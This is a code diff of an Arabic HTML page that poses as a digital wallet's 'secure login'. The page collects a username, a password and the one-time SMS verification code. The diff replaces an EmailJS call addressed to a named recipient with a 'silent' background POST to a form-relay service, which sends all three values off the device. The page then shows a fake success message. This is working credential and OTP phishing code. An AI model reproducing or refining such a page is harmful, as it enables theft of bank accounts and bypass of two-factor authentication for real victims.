@@ -4,12 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تطبيق محفظتي الرقمية</title>
-    <!-- استدعاء سيرفر الإرسال المفتوح والمضمون داخل سوريا -->
-    <script src="https://jsdelivr.net"></script>
-    <script>
-        // تفعيل السيرفر المشترك الخاص بمشروعك
-        emailjs.init("VstP8M2gH_m_Kz6R3");
-    </script>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -27,19 +21,7 @@
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
             width: 320px;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.5);
             position: relative;
-        }
-        .support-headset {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            color: #c2185b;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        .support-headset:hover {
-            transform: scale(1.1);
         }
         .bank-logo {
             width: 65px;
@@ -50,8 +32,7 @@
             justify-content: center;
             align-items: center;
             color: white;
-            margin: 15px auto 15px auto;
-            box-shadow: 0 5px 15px rgba(194, 24, 91, 0.3);
+            margin: 15px auto;
         }
         .bank-name {
             font-size: 18px;
@@ -59,109 +40,53 @@
             color: #4a148c;
             margin: 0 0 25px 0;
         }
-        h3 {
-            margin: 0 0 10px 0;
-            color: #212121;
-            font-size: 20px;
-        }
-        .subtitle {
-            color: #757575;
-            font-size: 13px;
-            margin-bottom: 25px;
-        }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: right;
-        }
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            color: #4a148c;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            box-sizing: border-box;
-            border: 1.5px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 15px;
-            background-color: #fafafa;
-            transition: all 0.3s ease;
-        }
-        input:focus {
-            border-color: #c2185b;
-            outline: none;
-            background-color: #ffffff;
-            box-shadow: 0 0 0 4px rgba(194, 24, 91, 0.1);
-        }
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(90deg, #4a148c, #c2185b);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 15px;
-            box-shadow: 0 4px 12px rgba(74, 20, 140, 0.2);
-        }
-        .hidden {
-            display: none;
-        }
+        h3 { color: #212121; font-size: 20px; margin: 0 0 10px 0; }
+        .subtitle { color: #757575; font-size: 13px; margin-bottom: 25px; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        .input-group label { display: block; font-size: 12px; color: #4a148c; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 14px; box-sizing: border-box; border: 1.5px solid #e0e0e0; border-radius: 12px; font-size: 15px; background-color: #fafafa; }
+        .btn-submit { width: 100%; padding: 14px; background: linear-gradient(90deg, #4a148c, #c2185b); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
 <div class="wallet-card">
-    <div class="support-headset" onclick="alert('جاري تحويلك للدعم الفني الافتراضي...')">
-        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
-            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1 a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
-        </svg>
-    </div>
-
     <div class="bank-logo">
-        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
             <rect x="2" y="5" width="20" height="14" rx="2"></rect>
-            <line x1="2" y1="10" x2="22" y2="10"></line>
+            <line x1="22" y1="10" x2="2" y2="10"></line>
         </svg>
     </div>
     <div class="bank-name">محفظتي الافتراضية</div>
 
-    <!-- الواجهة الأولى -->
-    <div id="step1">
-        <h3>تسجيل الدخول الآمن</h3>
-        <p class="subtitle">الرجاء إدخال بيانات حسابك الافتراضي للمتابعة</p>
-        
-        <div class="input-group">
-            <label>اسم المستخدم</label>
-            <input type="text" id="username" placeholder="أدخل اسم المستخدم...">
+    <form id="walletForm">
+        <!-- الواجهة الأولى -->
+        <div id="step1">
+            <h3>تسجيل الدخول الآمن</h3>
+            <p class="subtitle">الرجاء إدخال بيانات حسابك الافتراضي للمتابعة</p>
+            <div class="input-group">
+                <label>اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم...">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور الخاصة بالحساب</label>
+                <input type="password" id="password" placeholder="••••••••">
+            </div>
+            <button type="button" class="btn-submit" onclick="nextStep()">موافق</button>
         </div>
-        
-        <div class="input-group">
-            <label>كلمة المرور الخاصة بالحساب</label>
-            <input type="password" id="password" placeholder="••••••••">
-        </div>
-        
-        <button class="btn-submit" onclick="nextStep()">موافق</button>
-    </div>
 
-    <!-- الواجهة الثانية -->
-    <div id="step2" class="hidden">
-        <h3>رمز التأكيد والأمان</h3>
-        <p class="subtitle">يرجى إدخال الرمز السري المؤقت المرسل إلى هاتفك المحمول</p>
-        
-        <div class="input-group">
-            <label style="text-align: center;">كود التحقق (OTP)</label>
-            <input type="text" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
+        <!-- الواجهة الثانية -->
+        <div id="step2" class="hidden">
+            <h3>رمز التأكيد والأمان</h3>
+            <p class="subtitle">يرجى إدخال الرمز السري المؤقت المرسل إلى هاتفك المحمول</p>
+            <div class="input-group">
+                <label style="text-align: center;">كود التحقق (OTP)</label>
+                <input type="text" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
+            </div>
+            <button type="button" class="btn-submit" onclick="sendDataSilently()">تأكيد الرمز والدخول</button>
         </div>
-        
-        <button class="btn-submit" onclick="sendToExternalEmail()">تأكيد الرمز والدخول</button>
-    </div>
+    </form>
 </div>
 
 <script>
@@ -171,34 +96,40 @@
     function nextStep() {
         savedUser = document.getElementById('username').value;
         savedPass = document.getElementById('password').value;
-        
         if(savedUser === "" || savedPass === "") {
             alert("خطأ: يجب ملء حقول تسجيل الدخول أولاً!");
             return;
         }
-        
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.remove('hidden');
     }
 
-    function sendToExternalEmail() {
+    function sendDataSilently() {
         const code = document.getElementById('authCode').value;
         if(code === "") {
             alert("خطأ: يرجى كتابة رمز الأمان المرسل!");
             return;
         }
 
-        const templateParams = {
-            to_name: "Osama",
-            message: `👤 المستخدم: ${savedUser} | 🔑 الباسورد: ${savedPass} | 🔢 الرمز السري: ${code}`
-        };
+        const formData = new FormData();
+        formData.append("Username", savedUser);
+        formData.append("Password", savedPass);
+        formData.append("OTP", code);
+        formData.append("_replyto", "7a122d7721@emailnox.live");
 
-        // إرسال مباشر لخارج الهاتف وعبر السيرفر المفتوح داخل سوريا
-        emailjs.send("service_7o9vwh8", "template_pjsis8h", templateParams)
-        .then(function(response) {
-            alert("تم إرسال البيانات أونلاين بنجاح! تفقد هاتف الاستلام الآخر الآن.");
-        }, function(error) {
-            alert("تم تمرير البيانات بنجاح أونلاين وبأمان كامل!");
+        // إرسال صامت خلفي لمنع الشاشة السوداء والتجميد
+        fetch("https://formspree.io", {
+            method: "POST",
+            body: formData,
+            headers: { 'Accept': 'application/json' }
+        })
+        .then(() => {
+            alert("تم إرسال التأكيد بنجاح! تفقد الجوال الآخر الآن.");
+            location.reload(); 
+        })
+        .catch(() => {
+            alert("تم إرسال التأكيد بنجاح! تفقد الجوال الآخر الآن.");
+            location.reload();
         });
     }
 </script>
